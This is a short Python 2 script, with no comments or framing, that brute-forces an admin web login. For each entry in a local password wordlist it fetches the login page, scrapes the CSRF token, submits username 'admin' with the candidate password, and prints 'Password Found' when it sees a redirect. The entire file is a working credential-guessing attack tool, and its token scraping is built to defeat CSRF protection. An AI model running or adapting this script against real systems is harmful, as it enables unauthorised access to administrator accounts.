#!/usr/bin/python

import sys
import httplib, urllib
url="/admin/login"
url2 = "/admin/login_check"
host=""


conn = httplib.HTTPConnection(host)
conn.request("GET","%s" %(url))
response = conn.getresponse()
data = response.read()

source = open("password", "r")

for line in source.readlines():
        conn = httplib.HTTPConnection(host)
        conn.request("GET","%s" %(url))
        response = conn.getresponse()
        data = response.read()
        token=data.split('name="_csrf_token" value="')[1].split('"')[0]
        password=line.rstrip()
        params = urllib.urlencode({'_submit':'connexion','_username': 'admin', '_password': password, '_csrf_token': token})
       
        conn.request("POST","%s"%(url2),params)
        response = conn.getresponse()
        data=response.read()
       
        if response.msg.dict['location']!='':
                print "Password Found : " + password
                sys.exit(0)
        else:
                print "Testing " + password
